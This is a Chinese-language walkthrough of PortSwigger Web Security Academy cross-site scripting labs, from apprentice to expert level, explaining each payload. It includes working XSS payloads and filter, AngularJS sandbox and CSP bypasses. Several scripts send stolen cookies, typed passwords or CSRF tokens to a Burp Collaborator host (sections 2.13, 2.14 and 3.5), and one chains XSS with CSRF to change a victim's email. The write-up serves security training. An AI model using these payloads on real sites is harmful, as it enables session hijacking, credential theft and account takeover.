## 一、 前言

以下内容主要记录靶场的通关过程，对于一些代码的理解以及英文翻译大多来自于GPT，可能存在不是很准确的地方，如有错误，还望指出。

## 二、过程记录

### 1、学徒

##### 1.1 反射型 搜索框  
![](https://image.3001.net/images/20230711/1689040834_64acb7c2c67b12a42f2b8.jpg!small)

    
    
    <script>alert(1)</script>
    

#####  

##### 1.2 存储型 评论区  
![](https://image.3001.net/images/20230711/1689041067_64acb8ab1019f1267393c.jpg!small)

    
    
    <script>alert(1)</script>
    

#####  

##### 1.3 搜索框 DOM XSS document.write()

输出位置：

    
    
    <img src="/resources/images/tracker.gif?searchTerms=111">
    

![](https://image.3001.net/images/20230711/1689041275_64acb97b15f6b742656ad.jpg!small)

    
    
    "><script>alert(1)</script><"  //闭合前后的一个引号以及尖括号
    

在前端开发中，常常使用 DOM（Document Object Model）来操作文档对象，其中 location.search 是一个常用属性，用于获取
URL 中的查询参数部分。在某些情况下，可能使用`document.write()`方法动态地向页面中写入 HTML
代码，如果这个过程中未对输入进行过滤，攻击者就可以通过传递特殊的查询参数来注入恶意脚本，造成 XSS 攻击。

#####  

##### 1.4 搜索框 innerHTML设置元素

输入payload后，插入，但是没有被执行

![](https://image.3001.net/images/20230711/1689041300_64acb99430fe8f0a64f2b.jpg!small)

这是因为innerHTML是将内容解析为HTML，并将其插入到元素中。在这种情况下，当将location.search的值赋给innerHTML时，它会被解析为文本而不是HTML代码。这意味着会被视为纯文本而不是可执行的JavaScript代码。

payload：

    
    
    <img src="x" onerror="alert(1);">
    

![](https://image.3001.net/images/20230711/1689041385_64acb9e96fad549ed913a.jpg!small)

当插入`<img src="x"
onerror="alert(1);">`时，主要是因为`onerror`事件是在加载图片时触发的，而不是通过`innerHTML`插入的内容。

#####  

##### 1.5 DOM XSS in jQuery anchor href attribute sink using location.search
source

打开实验室后，找到输入输出点，returnpath是可控的

![](https://image.3001.net/images/20230711/1689041917_64acbbfd1a07c8243aee2.jpg!small)

将javascript:alert(1)添加到URL后面，访问点击back触发。

#####  

##### 1.6 使用 hashchange 事件的 jQuery 选择器漏洞中的 DOM XSS 攻击

打开实验室，访问网页源代码之后，找到如下代码：

    
    
    <script>
    $(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
    });
    </script>
    

hashchange 事件是在 Web 浏览器中的 URL 锚点部分（通常是 URL
中的`#`符号后面的部分）发生更改时触发的事件。当用户在浏览器中进行页面内导航或更改 URL 锚点时，会触发 hashchange 事件，从而可以通过
JavaScript 进行相应的处理。

如何传递，在 URL 后面加上`#`符号和哈希值即可：

    
    
    http://example.com/#my-hash-value
    

通常用于跳转到网页的指定位置

    
    
    https://0a3700460327b5de984390ec00f10046.web-security-academy.net/#Festivals   //跟<h2>标题就能跳转
    

传入payload尝试：

    
    
    https://0a4700c60393a0dc80730d98004b009e.web-security-academy.net/#<img src=1 onerror=print()>
    

![](https://image.3001.net/images/20230711/1689041960_64acbc2892d51fca5c8e9.jpg!small)

上诉代码中，使用了jQuery的`$(window).on('hashchange',
function(){})`来监听浏览器URL中哈希值（`#`后面的部分）的变化。当哈希值发生变化时，会执行相应的回调函数。因此，当传入了一个具有恶意代码的哈希值`<img
src=1
onerror=print()>`。当URL的哈希值发生变化时，jQuery的`hashchange`事件被触发，然后执行了相应的回调函数，从而触发payload。

#####  

##### 1.7 搜索框 通过对<>进行 HTML 编码注入

搜索框位置，搜索后查看输出

![](https://image.3001.net/images/20230711/1689041994_64acbc4a34eab765c1a0c.jpg!small)

一些能在input中触发的事件，如下：

    
    
    当 <input> 元素的值发生变化并失去焦点时触发
    <input type="text" onchange="alert('Value changed!');" /> 
    
    当用户在输入框中输入内容时即时触发。
    <input type="text" oninput="alert('Input detected!');" />
    
    当 <input> 元素获得焦点时触发。
    <input type="text" onfocus="alert('Input focused!');" />
    
    当 <input> 元素失去焦点时触发。
    <input type="text" onblur="alert('Input blurred!');" />
    
    当用户按下键盘上的按键、释放按键或按住按键时触发。
    <input type="text" onkeydown="alert('Key down!');" />
    <input type="text" onkeyup="alert('Key up!');" />
    <input type="text" onkeypress="alert('Key press!');" />
    
    当鼠标悬停在输入框上方时
    <input type="text" onmouseover="alert('Mouse over input!');" />
    

需要闭合一下，输入payload：

    
    
    "onchange="alert(1)
    

![](https://image.3001.net/images/20230711/1689042038_64acbc7652c4f356855b8.jpg!small)

#####  

##### 1.8 存储型 XSS 攻击，通过对锚点 href 属性的双引号进行 HTML 编码注入

插入评论后查看输出点：

![](https://image.3001.net/images/20230711/1689042106_64acbcba02ce120ab4bb0.jpg!small)

写入payload：

    
    
    payload：javascript:prompt(1)
    

在给`<a>`元素的`href`属性中使用`javascript:`伪协议时，其中的 JavaScript
代码会被执行。在这种情况下，`prompt(1)`不需要用引号引起来是因为它是一个有效的 JavaScript 函数调用。

![](https://image.3001.net/images/20230711/1689042352_64acbdb063a910530b17c.jpg!small)

#####  

##### 1.9 反射型 XSS 将恶意代码注入到 JavaScript 字符串中触发-HTML 编码

查看输出

![](https://image.3001.net/images/20230711/1689042401_64acbde13deea8f8f280b.jpg!small)

触发点：var searchTerms = '111';

    
    
    paylaod:'-confirm(1)-'
    

![](https://image.3001.net/images/20230711/1689042428_64acbdfcd5ed5193c5d85.jpg!small)

因此，通过将`confirm(1)`放在两个连字符（`-`）之间，在执行<script>中的代码时，-被当做了算数运算符，而不是单纯的字符，因此img标签中输出的是数字-1而不是字符。

### 2、从业者

##### 2.1 DOM XSS in document.write sink using source location.search inside a
select element

要完成此实验，请执行跨站点脚本攻击，该攻击会突破 select 元素并调用该alert函数。

![](https://image.3001.net/images/20230711/1689042470_64acbe26b8a8718d32847.jpg!small)

根据script中的代码知道storeid是通过URL获取的，因此在URL上添加传参，在写入payload即可

    
    
    https://0aa600ac035f0cc58522542100630099.web-security-academy.net/product?productId=1&storeId=<script>alert(1)</script>
    

![](https://image.3001.net/images/20230711/1689042508_64acbe4c0f276bd62af01.jpg!small)

#####  

##### 2.2 AngularJS 客户端模板注入（XSS）

[AngularJS](https://www.runoob.com/angularjs/angularjs-tutorial.html)是一个
JavaScript 框架，用于构建单页面应用程序。

在处理Angular应用时，有几件事情你需要了解。

 **ng-app**

`ng-app`指令用于引导一个 AngularJS 应用程序，并定义应用程序的作用范围。当 AngularJS 框架初始化时，它会在 HTML
文档中寻找`ng-app`指令，并将应用程序的根元素确定为该指令所在的元素。

 **AngularJS 表达式**

AngularJS 表达式写在双大括号内：{{ expression }}。AngularJS 将在表达式书写的位置"输出"数据。AngularJS 表达式
很像 JavaScript 表达式：它们可以包含文字、运算符和变量。

进入实验使用计算表达式输入查看，发现计算表达式被执行，表明应用很容易受到客户端模板注入的影响。

![](https://image.3001.net/images/20230711/1689042550_64acbe764f590fb12195c.jpg!small)

    
    
    payload：
    {{$on.constructor('alert(1)')()}}
    {{constructor.constructor('alert(1)')()}}
    

`{{constructor.constructor('alert(1)')()}}`中的表达式利用了 JavaScript
的`constructor`属性和`Function`构造函数来执行代码。这是一个安全漏洞，因为它绕过了 AngularJS
的内置安全机制，从而导致代码执行。

![](https://image.3001.net/images/20230711/1689042582_64acbe96ae0939b63bc21.jpg!small)

#####  

##### 2.3 DOM 型 JS文件执行过程中触发

打开实验室是一个搜索框，输出的位置没法触发

![](https://image.3001.net/images/20230711/1689042641_64acbed19b5a763f03e8f.jpg!small)

search('search-results')是searchResults.js中定义的一个函数，进入查看，看到有个eval，eval能直接执行alert。

    
    
    eval('alert("Hello, world!");');
    

输入alert(1)执行下断点调试查看

![](https://image.3001.net/images/20230711/1689042675_64acbef3a863ad03247b3.jpg!small)

进入searchResultsObj中可以看到

![](https://image.3001.net/images/20230711/1689042712_64acbf18ca6d7ccbfdaed.jpg!small)

想想如何闭合，已存在的引号前面没法动，所以需要自己加一个引号需要转义，在闭合掉大括号，最后在注释掉后面没用的东西

    
    
    {"results":[],"searchTerm":"\"};alert(1);//"}
    最后形成的payload：\"};alert(1);//
    带入执行时：var searchResultsObj = {"results":[],"searchTerm":"\\"};alert(1);//"}
    

![](https://image.3001.net/images/20230711/1689042771_64acbf530809f289b7c27.jpg!small)

#####  

##### 2.4 存储型 replace绕过

评论区输入：

    
    
    输入：<img src="x" onerror="alert(1);">
    输出:<p>&ampltimg src="x" onerror="alert(1);"&ampgt</p>  //<>被编码
    

查看源代码：

![](https://image.3001.net/images/20230711/1689042814_64acbf7ed52b97ab277a8.jpg!small)

问题在于replace方法，当使用`replace`方法时，它会在字符串中查找特定的子字符串，并用新的字符串来替换找到的第一个匹配项，所以这里只会对第一个传入的<>进行编码，如下：

![](https://image.3001.net/images/20230711/1689042843_64acbf9bca73d47139a61.jpg!small)

构造payload：<><img src=1 onerror=alert()>

![](https://image.3001.net/images/20230711/1689042876_64acbfbce99fced50736a.jpg!small)

#####  

##### 2.5 Reflected XSS into HTML context with most tags and attributes
blocked

在搜索框处存在一个反射性XSS，正常搜索内容可以，使用payload：<script>alert(1)</script>就会返回"Tag is not
allowed"

![](https://image.3001.net/images/20230711/1689042907_64acbfdb4f6471c5cffc6.jpg!small)

先看看那些符号会被过滤，单独的<、>、<1>、alert都不会，但是<script>以及<img>会被拦截，大小写无用；

尝试了多种绕过方式没绕过，看了提示使用burp的[XSS备忘录](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)进行FUZZ找到了可用的标签以及事件（body和onresize）。

![](https://image.3001.net/images/20230711/1689042931_64acbff32454a948b6487.jpg!small)

    
    
    <body onresize="print()"> //该onresize事件会在窗口发现大小变化时触发
    

#####  

##### 2.6 反射型 阻止除自定义标签之外的所有标签

在除自定义标签之外的所有标签被阻止的情况下，进行反射型XSS攻击。

自定义标签通常以`<x-`、`<my-`或其他自定义前缀开头，以与常见的HTML标签区分开来。通过自定义标签，可以扩展HTML的语义，并实现自己所需的功能。

    
    
    <my-xss onmouseover="alert(document.cookie)"></my-xss>
    

打开实验室，是一个搜索框，将构造的payload传入，payload生效了但是没有触发，也没有被拦截

![](https://image.3001.net/images/20230711/1689042962_64acc012b748b4cfe523f.jpg!small)

查看提示，原来这里需要使用#片段标识符，通常用于在网页中定位特定的片段或锚点

再次调整：

    
    
    payload：<my-xss id=123 onfocus=alert(1) tabindex=1>#123
    

自定义元素带有以下属性和值：

  * `id=123`：这是一个给元素分配的唯一标识符，值为`123`。
  * `tabindex=1`：这是指定元素的 Tab 键索引（Tab Index）属性，用于指定元素在使用 Tab 键进行导航时的顺序。在这里，`tabindex=1`将该元素设置为可通过 Tab 键聚焦的元素，并指定其在 Tab 键顺序中的位置为`1`。

`#123`是片段标识符（Fragment Identifier）部分，它位于 URL
的井号（#）后面，`#123`表示要跳转到具有`id`值为`123`的元素所在的位置，因此触发payload。

![](https://image.3001.net/images/20230711/1689056161_64acf3a1ebff75a28a319.png!small)

#####  

##### 2.7 允许一些SVG标记的反射型XSS

打开实验室是一个搜索框，尝试了一些常见payload但是都无法绕过，返回均是"Event is not allowed"；

    
    
    <svg onload=alert(1)>
    <svg xmlns:xlink="http://www.w3.org/1999/xlink"><a><circle r=100 /><animate attributeName="xlink:href" values=";javascript:alert(1)" begin="0s" dur="0.1s" fill="freeze"/>
    <svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS Attack')">
    <svg onafterscriptexecute=alert(1)><script>1</script>
    <svg id=x onfocus=alert(1)>
    

这里还是使用burp的XSS备忘录进行fuzz

![](https://image.3001.net/images/20230711/1689043130_64acc0baef2bed1e68439.jpg!small)

在翻XSS 备忘录时翻到了svg标签的payload，于是在这尝试，顺便查一下这些标签什么意思

![](https://image.3001.net/images/20230711/1689043178_64acc0eab77728e7ee521.jpg!small)

这几个SVG元素标签（`<animate>`,`<animateMotion>`,`<animateTransform>`,`<set>`）都用于创建SVG动画效果，但它们在功能和用法上有一些区别。

  * `<animate>`：`<animate>`标签用于创建基于属性值的动画效果。
  * `<animateMotion>`：`<animateMotion>`标签用于创建SVG元素的动态运动效果。
  * `<animateTransform>`：`<animateTransform>`标签用于对SVG元素的变换属性进行动画操作
  * `<set>`：`<set>`标签用于在指定的时间点设置SVG元素的属性值。

在构造XSS
payload时，这些标签可以与事件和属性结合使用来触发恶意代码的执行。例如，通过在动画或属性设置中使用`onbegin`、`onend`等事件属性，可以指定在动画开始或结束时执行特定的JavaScript代码，从而实现XSS攻击。

    
    
    payload:<svg><animatetransform onbegin=alert(1) attributeName=transform>
    

![](https://image.3001.net/images/20230711/1689044025_64acc439038666c740e73.jpg!small)

#####  

##### 2.8 Reflected XSS in canonical link tag

打开实验环境查看，唯一有输入输出的地方只有评论和URL，根据题目描述F12在代码里找了一下link，感觉可能和它有关吧

![](https://image.3001.net/images/20230711/1689044129_64acc4a14b21b5e5fec35.jpg!small)

通过在URL上增加一个传参，尝试对这个link标签中的参数进行控制查看，发现href的链接可控，尝试了payload，这里引号可以闭合，但是<>被转义了；

![](https://image.3001.net/images/20230711/1689044151_64acc4b70f6d765f71471.jpg!small)

题目描述中已告知,为了协助您的利用，您可以假设模拟用户将按下以下组合键：

  * `ALT+SHIFT+X`
  * `CTRL+ALT+X`
  * `Alt+X`

查了一下需要使用[HTML accesskey](https://www.runoob.com/tags/att-global-accesskey.html)属性去触发

最终得的payload：

    
    
    'accesskey='x'onclick='alert(1)   //按ALT+X触发
    

![](https://image.3001.net/images/20230711/1689044281_64acc5396eb494e0d6add.jpg!small)

这里只能使用onclick，其他事件无法触发。

#####  

##### 2.9 单引号以及反斜线被转义

在搜索框出输入随机字符，F12查看输出

![](https://image.3001.net/images/20230711/1689044323_64acc563f39cf47ed7ce1.jpg!small)

随机输入了一个payload后发现页面输出不正常，它将我输入的</script>渲染了，而它自己的标签被顶掉了

![](https://image.3001.net/images/20230711/1689044422_64acc5c635f340bd15a6d.jpg!small)

尝试闭合script，成功

    
    
    </script><script>alert(1)</script><script>
    

![](https://image.3001.net/images/20230711/1689044469_64acc5f5142f67f16cef5.jpg!small)

#####  

##### 2.10 尖括号双引号单引号被转义/编码

输入字符'11"<22>查看输出，发现确实被编码或转义，单引号前面加了转义符

![](https://image.3001.net/images/20230711/1689044607_64acc67f9d2695e5b56bc.jpg!small)

和上一题比较这里没有转义反斜线，但是<>不能用，那也就只也就只能使用alert()、print()、prompt()这种;

这里插入\'prompt()//发现，//';被成功当作了注释符，颜色变绿了，那么前面单引号也闭合了

![](https://image.3001.net/images/20230711/1689044638_64acc69ea0551709ec01f.jpg!small)

但是还是没有执行，这里让我想起了前面的运算符，添加上--后成功触发

    
    
    payload：\'-prompt()-//
    

#####  

##### 2.11 存储型XSS HTML 实体编码

在一个 onclick 事件中实现存储型 XSS 攻击，并且需要处理 HTML 编码的尖括号和双引号，以及对单引号和反斜线进行转义。

打开实验室是一个评论区，输入正常的数据，输出代码如下：

![](https://image.3001.net/images/20230711/1689044683_64acc6cb600f0a2f3a7a8.jpg!small)

需要闭合单引号，测试发现将单引号进行HTML实体编码后传入不会被加上转义符，另外需要以http或者https开头，用?或者&串起来就行

    
    
    http://123/?&#39;-alert(1)-&#39;
    

点击一下链接来触发

![](https://image.3001.net/images/20230711/1689044710_64acc6e676b49afec0329.jpg!small)

#####  

##### 2.12 将反射型 XSS 注入到模板字符串

还是熟悉的搜索框，题目中说到了template，想起了之前的Angular模板，输入字符查看，基本上都被unicode编码，除了()、-、{}、[]

![](https://image.3001.net/images/20230711/1689044754_64acc7120018465bd45be.jpg!small)

F12看network，没看出来是那种模板，查了一下JavaScript 也提供了自己的模板字符串（Template
Strings）功能，用于更方便地处理字符串拼接和插值。

在 JavaScript
的模板字符串中，使用`${}`语法来插入变量或表达式的值。模板字符串使用反引号`包裹，而不是单引号或双引号。在`${}`内部，可以放置任何有效的
JavaScript 表达式，它会被求值并替换为对应的值。

因此这里尝试payload：${alert(1)} ，成功弹窗。

![](https://image.3001.net/images/20230711/1689044787_64acc7332300f658d98f4.jpg!small)

#####  

##### 2.13 存储型 利用跨站点脚本窃取 cookie burp Collaborator外带COOKIE

评论处，没有任何编码限制，但是需要使用burp collaborator将cookie外带出来

![](https://image.3001.net/images/20230711/1689044815_64acc74f713cba6518f52.jpg!small)

JavaScript发送网络请求可以使用XMLHttpRequest（XHR）以及Fetch，使用fetch

    
    
    <script>
    fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
    method: 'POST',
    body:document.cookie
    });
    </script>
    

将BURP-COLLABORATOR-SUBDOMAIN替换，插入到评论中，此时会收到响应，响应中包含管理员的Cookie

![](https://image.3001.net/images/20230711/1689044862_64acc77e14eb632626dce.jpg!small)

访问/my-account抓包将获得的COOKIE添加上去，通过。

#####  

##### 2.14 存储型 XSS burp Collaborator捕获密码

还是在评论区处，无过滤在网上查了一下，有一种方法是通过插入一个高仿的后台登录页面来套取密码，根据思路使用gpt大概写了如下代码。

    
    
    <!-- 用户名输入框 -->
    <input name="username" id="username">
    
    <!-- 密码输入框 -->
    <input type="password" name="password">
    
    <!-- 提交按钮 -->
    <button onclick="sendRequest()">submit</button>
    
    <script>
    function sendRequest() {
      // 获取用户名和密码的值
      var username = document.getElementById("username").value;
      var password = document.getElementsByName("password")[0].value;
    
      if (password.length > 0) {
        // 创建 XMLHttpRequest 对象
        var xhr = new XMLHttpRequest();
    
        // 配置请求
        xhr.open("POST", "https://BURP-COLLABORATOR-SUBDOMAIN", true);
        xhr.setRequestHeader("Content-type", "text/plain;charset=UTF-8");
    
        // 发送请求，将用户名和密码作为body
        xhr.send(username + ":" + password);
      }
    }
    </script>
    

插入后，触发过后是这样

![](https://image.3001.net/images/20230711/1689044893_64acc79d88c28801f896c.jpg!small)

但是后台机器人好像触发不了，只能给自己玩。看了提示，需要使用事件触发，不能用submit。

更改后

    
    
    <input name="username" id="username">
    <input type="password" name="password" onchange="sendRequest()">
    
    <script>
    function sendRequest() {
      var username = document.getElementById("username").value;
      var password = document.getElementsByName("password")[0].value;
    
      if (password.length > 0) {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://BURP-COLLABORATOR-SUBDOMAIN", true);
        xhr.setRequestHeader("Content-type", "text/plain;charset=UTF-8");
        xhr.send(username + ":" + password);
      }
    }
    </script>
    

插入后等待几秒即可接收到请求，请求中包含用户名和密码

![](https://image.3001.net/images/20230711/1689044940_64acc7ccea13dce8e5ae0.jpg!small)

#####  

##### 2.15 利用 存储型XSS 执行 CSRF

利用XSS+CSRF更改查看/评论博客帖子的人的电子邮件。

登录后有一个更新邮件的功能：

接口：/my-account/change-email

![](https://image.3001.net/images/20230711/1689044981_64acc7f568e8b10c43cfd.jpg!small)

先抓一个更新邮件的包，在构造一个由js触发的POST请求从而达到更改邮件的目的。

请求包：

    
    
    POST /my-account/change-email HTTP/2
    Host: 0abf00d1046f5fa2841e365200ef00db.web-security-academy.net
    Cookie: session=Q8zMJNYPMooN3rEuZTUiGe9pzeCQXzAJ
    ...省略
    email=test%40normal-user.net&csrf=64aNac6mLKMSVIvlgws0KM3KnqE27NlL
    

构造请求：

    
    
    <script>
    fetch('/my-account/change-email', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: 'email=test22%40normal-user.net&csrf=64aNac6mLKMSVIvlgws0KM3KnqE27NlL'
    })
      .then(response => {
        // 处理响应
        console.log(response);
      })
      .catch(error => {
        // 处理错误
        console.error(error);
      });
    </script>
    

插入后访问，确实把自己的邮箱给改了，但是并没有通过，后来发现跟csrf值有关，需要先获取到这个token，然后再带上token去更改密码；

解决方法，先GET请求一下/my-account接口，在响应包中获取到了token之后再访问修改邮件接口进行邮件修改，根据解决方案进行了修改；

    
    
    <script>
    var req = new XMLHttpRequest();
    req.onload = handleResponse;
    req.open('get','/my-account',true);
    req.send();
    
    function handleResponse() {
        var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    
        fetch('/my-account/change-email', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: 'csrf=' + token + '&email=test@test.com'
        });
    };
    </script>
    

`this.responseText.match`是 XMLHttpRequest
对象的属性之一，它用于获取从服务器返回的响应文本，并使用正则表达式进行匹配操作。

`this.responseText.match(/name="csrf"
value="(\w+)"/)`是将`this.responseText`中符合正则表达式的部分进行匹配，并返回一个包含匹配结果的数组。

### 3、专家

##### 3.1 反射型 XSS 允许部分tag但href 属性被阻止

请注意，您需要用“点击”一词标记您的矢量，以诱导模拟实验室用户点击您的矢量。例如：

    
    
    <a href="">Click me</a>
    

打开实验室是一个搜索框，构造一个a标签的payload，简单测试，只要href后面是=就会被阻止：

![](https://image.3001.net/images/20230711/1689045026_64acc82279a559dee81d2.jpg!small)

尝试能不能绕过=限制，=绕不过那就FUZZ

使用burp XSS 备忘录，找到能用的tags:

    
    
    <a>
    <animate>
    <svg>
    

但是使用XSS备忘录里的events fuzz没有一个合适的。

官网答案：

    
    
    <svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
    

这个payload利用了SVG标签和标签的特性，通过更改href属性的值来触发JavaScript代码的执行，以实现XSS攻击。当用户点击"Click
me"文本时，动画开始播放并触发弹窗警告框。

![](https://image.3001.net/images/20230711/1689045072_64acc8503646893055ea6.jpg!small)

#####  

##### 3.2 JavaScript URL中存在反射型XSS漏洞，但是某些特殊字符被阻止使用

点击查看blog的URL：

    
    
    https://0a6a007003eb8e4480349e8a0003008e.web-security-academy.net/post?postId=2
    

通过F12，查找URL上的参数找到了输出位置

![](https://image.3001.net/images/20230711/1689045096_64acc86866d8951d333ce.jpg!small)

但是发现无论传什么在后面都会报"Invalid blog post ID"，而且看不到输出，整迷糊了，后来才想起来用?和&连接起来尝试；

![](https://image.3001.net/images/20230711/1689045130_64acc88ae86868940a289.jpg!small)

使用&后回显终于正常了，先构造一个paylaod试试：

    
    
    payload:&'});alert(1);//
    
    输出：javascript:fetch('/analytics', {method:'post',body:'/post?postId=4&'};alert1;//'}).finally(_ => window.location = '/')
    

括号被吃掉了，而且后面的注释符没有生效，alert1的括号可以以反引号代替，但是反引号也被过滤

    
    
    paylaod: &'},{alert`1`
    输出：javascript:fetch('/analytics', {method:'post',body:'/post?postId=4&'},{alert1'}).finally(_ => window.location = '/')
    

查了一下有一种在javascript语句中调用函数而不使用括号（使用`onerror`和`throw`）的方法

    
    
    <script>onerror=alert;throw 1337</script>
    

经过各种调整闭合尝试没成功，看了官方答案：

    
    
    payliad:&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
    
    组合后：javascript:fetch('/analytics', {method:'post',body:'/post?postId=4&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:''}).finally(_ => window.location = '/')
    

这个 payload 利用了 JavaScript 中的函数表达式和对象的特性来执行代码。

`&'}`: 这一部分的作用是关闭之前的 URL 参数，并在该位置插入一个空的对象结束当前 JavaScript URL 代码块。

`x=x=>{throw/**/onerror=alert,1337}`:
这是一个函数表达式，定义了一个名为`x`的函数。函数体部分`throw/**/onerror=alert,1337`利用`throw`关键字和`onerror`事件处理程序来触发弹窗，并传递参数`1337`。

`toString=x`: 这一部分将函数`x`转换为字符串表示形式。

`window+''`: 这是将`window`对象转换为字符串的方式之一。

`{x:''}`: 这是一个 JavaScript 对象字面量，用于存储一个名为`x`的空字符串属性。

在请求处理过程中，由于存在触发`onerror`事件处理程序的代码片段，浏览器会执行其中的`alert(1337)`，从而触发弹窗并显示数字`1337`。

![](https://image.3001.net/images/20230711/1689045195_64acc8cbcaf6985e1d8fd.jpg!small)

#####  

##### 3.3 Reflected XSS with AngularJS sandbox escape without strings

打开页面是一个搜索框

![](https://image.3001.net/images/20230711/1689045243_64acc8fb2a46f7905866a.jpg!small)

看了这段代码的含义，没理解，直接看答案：

    
    
    payload:
    1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
    

该漏洞利用`toString()`方法创建一个不使用引号的字符串。然后它获取`String`原型并覆盖每个字符串的`charAt`函数。这有效地破坏了AngularJS的沙箱。接下来，将一个数组传递给`orderBy`过滤器。然后，我们使用`toString()`再次创建一个字符串，并使用`String`的构造函数属性来设置过滤器的参数。最后，我们使用`fromCharCode`方法将字符代码转换为字符串，生成我们的有效载荷`x=alert(1)`。由于`charAt`函数已被覆盖，AngularJS将允许执行这段代码，而通常情况下不会允许。

![](https://image.3001.net/images/20230711/1689045272_64acc918cec22867353df.jpg!small)

补充：

[XSS备忘录 AngularJS沙箱逃逸POC](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected)

[GitHub别人收集的POC](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md)

#####  

##### 3.4 利用 AngularJS 沙箱逃逸和内容安全策略（CSP）的反射型 XSS 攻击

依旧是一个搜索框

![](https://image.3001.net/images/20230711/1689045310_64acc93ee544a8fecb32f.jpg!small)

在[XSS备忘录](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected)中找到了合适的

    
    
    payload：
    <input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>
    

![](https://image.3001.net/images/20230711/1689045349_64acc965e060f5bc0a15b.jpg!small)

#####  

##### 3.5 CSP保护的反射型XSS攻击，利用[悬挂标记](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)攻击

这个实验室要求我们执行一个跨站脚本攻击（Reflected XSS），绕过一个非常严格的内容安全策略（CSP），并利用Burp
Collaborator窃取模拟受害用户的CSRF令牌。然后，我们需要将模拟用户的电子邮件地址更改为[hacker@evil-user.net](mailto:hacker@evil-user.net)。

为了诱使模拟用户点击恶意链接，我们必须在向量中使用"Click"这个词。例如：

    
    
    <a href="">Click me</a>
    

您可以使用以下凭据登录到您自己的帐户：`wiener:peter`

登录后F12查看代码，可以看到form里的XSS触发点

![](https://image.3001.net/images/20230711/1689045374_64acc97e60829746f8768.jpg!small)

插入payload，可以看到已经闭合了，但是没有触发弹框，是被CSP拦截了

![](https://image.3001.net/images/20230711/1689045390_64acc98e0322d89ab63dc.jpg!small)

CSP策略

![](https://image.3001.net/images/20230711/1689045415_64acc9a7bc03f13b45c58.jpg!small)

这个报错信息表示由于违反了特定的 Content Security Policy (CSP) 指令 "script-src
'self'"，浏览器拒绝执行内联脚本。

修改邮件需要email和csrf两个参数

![](https://image.3001.net/images/20230711/1689045442_64acc9c24ec51400cc473.jpg!small)

需要获取受害者的csrf，才能更改邮箱。

悬挂标签的使用

    
    
    "><img src='//attacker-website.com?
    

![](https://image.3001.net/images/20230711/1689045476_64acc9e41febdde4548fa.jpg!small)

但是这里使用img悬挂标签带出csrf也会被CSP（img-src 'self'）拦截，需要绕过CSP

![](https://image.3001.net/images/20230711/1689045494_64acc9f61cc39906eeac3.jpg!small)

如何绕过CSP拿到csrf，我在查找的时候在[这里](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection)找到了能够绕过CSP的标签：

    
    
    <a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
    <base target='
    

具体来说，由于`<base>`元素的存在，页面上所有相对 URL 都会根据指定的基准 URL 进行解析。在这个 POC
中，`<base>`元素的`target`属性被设置为一个不完整的值，只有一个起始单引号。这导致接下来的 HTML 内容将被视为基准 URL，并影响到相对
URL 的解析。

在接下来的`<a>`元素中，有一个超链接指向`http://attacker.net/payload.html`，但由于缺少`>`符号，整个`<base>`元素的值被视为链接的目标窗口。

当用户点击这个链接时，浏览器会将新页面加载到目标窗口中，并将`window.name`设置为整个`<base>`元素的值，即包含了未闭合的`<base>`元素和`<a>`元素的
HTML 内容。

![](https://image.3001.net/images/20230711/1689045520_64acca10e1fa641000ce8.jpg!small)

  

根据官方的poc拿到csrf

    
    
    <script>
    if(window.name) {
    	new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);
    	} else {
    		location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email="><a href="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit">Click me</a><base target=%27';
    }
    </script>
    

![30.8](https://image.3001.net/images/20230711/1689066501_64ad1c05166e66875599a.jpg!small)

拿到csrf后再构造一个csrf poc，需要在option中勾选auto submit script，生成poc提交

![30.9](https://image.3001.net/images/20230711/1689066548_64ad1c34dd8b64132a35c.jpg!small)

#####  

##### 3.6 CSP bypass和反射型 XSS

在搜索框输入payload，alert弹窗被阻止

![31.1](https://image.3001.net/images/20230711/1689066625_64ad1c81227ec47aaa9c4.jpg!small)

因为token参数可控，所以导致可以更改CSP策略，从而执行脚本。这里需要了解一下script-src-elem和script-src

`script-src-elem`：指定了允许在 `<script>`元素中加载和执行的脚本代码的来源。它用于控制内联脚本（inline
scripts）的加载行为，即直接在 HTML 中嵌入的脚本代码。`script-src`：指定了脚本加载的默认策略，用于控制
`<script>`元素以外的脚本加载行为，例如通过外部脚本文件加载的脚本。

    
    
    <script>alert(1)</script>   //内联脚本  
    <script src="script.js"></script>  //外联脚本

允许内联脚本的执行，需要将script-src-elem设置为'unsafe-inline'，允许执行。

![31.2](https://image.3001.net/images/20230711/1689066638_64ad1c8e4a5d73777c288.jpg!small)

  

## 三、总结

输入输出分析：仔细分析应用程序的输入和输出点。了解用户输入是如何被接收和处理的，并确定它们在哪里被输出到前端页面。常见的输入点包括表单字段、URL 参数等。

xss的闭合：研究闭合标签和特殊字符的处理方式。尝试在输入点附近插入特殊字符、尖括号、引号等，并观察它们是否被正确地闭合或转义。

触发点：有很多实际注入到了HTML中，但是没有触发，可以尝试文中的方式，利用按键等方式进行触发。

片段标识符#，XSS 攻击中，可以使用片段标识符来注入恶意脚本或进行其他形式的攻击。

